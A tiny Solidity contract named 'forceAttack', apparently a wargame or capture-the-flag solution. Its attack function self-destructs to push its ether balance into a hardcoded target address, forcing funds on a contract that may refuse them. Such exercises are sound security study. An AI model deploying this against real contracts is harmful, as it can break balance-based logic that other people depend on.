// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract forceAttack{
    function attack() public{
        selfdestruct(0x8B51B0e946ec4f05A41916ba57f79B908ba8E771);
    }

    receive() external payable{}
}